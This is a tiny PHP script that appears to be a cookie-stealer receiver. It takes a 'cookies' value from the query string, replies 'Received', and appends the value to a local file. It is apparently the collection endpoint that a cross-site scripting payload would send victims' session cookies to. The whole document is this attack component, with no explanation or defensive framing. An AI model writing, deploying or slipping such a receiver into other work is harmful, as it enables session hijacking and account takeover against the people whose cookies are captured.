<?php
    if (isset($_GET["cookies"])) {
      echo "Received";
      file_put_contents("cookies", $_GET["cookies"] ,FILE_APPEND);
    }
  ?>
